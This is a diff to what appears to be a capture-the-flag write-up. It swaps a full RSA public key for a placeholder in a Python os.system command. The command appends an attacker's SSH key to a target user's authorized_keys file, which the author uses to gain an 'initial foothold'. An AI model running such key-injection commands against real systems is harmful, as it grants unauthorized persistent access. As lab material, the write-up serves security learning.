@@ -44,7 +44,7 @@ Nice! I found I have the ability to run os system commands. During enumeration, 
 {% highlight bash %}
 import os
 
-os.system("echo '\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDddlPwshbr4NArM2u/jRvS+qMDVkw+psOkhifL8sVMeWcPGbRed/Dv8qfSxwCR0Cmt9aQLWjr1sg5efyVXgXyHbq51HWL+CxYi8E3znB1D0V58De0JE0eiVfVImLMs7ntjCcJATv46/3KKEZc9t/d0Iw1AlFPDl8YH/OxFAOppXKE2KYqMtIG45NB087lxteR/Of2N8xY0aXocO/fU+Xv/KGjevXtsYW0cSuND8scY3q6W1vJXUltCAFOES/IrS6BJxKqdrOkZBIai1nz61SVXJwdiEX40Hj561jt+TKXVVC05KZbhJBhQN1KGPhK9xvvAgMNMfuhrTPATdQIAj+fQpW7linY+xlyaVCEBW4FLuahelKLhCwg4GnXUfSc3bXhOQcJ8Ts96dDc2PFFKwfftESsPFgrm+DPnnMbTNkPjQXz5wtzWO+eOHApiWr4s2w3sohniFQLHwvjNFq4HgKsXjZXSZ3bPbI4eC0JWc+49AWnxVOD6eVzoUdpVDwgRRjs= root@kali' >> /home/hal/.ssh/authorized_keys")
+os.system("echo '\nssh-rsa [your RSA key] root@kali' >> /home/hal/.ssh/authorized_keys")
 {% endhighlight %}
 
 And now I can login to SSH! Awesome, initial foothold gained!
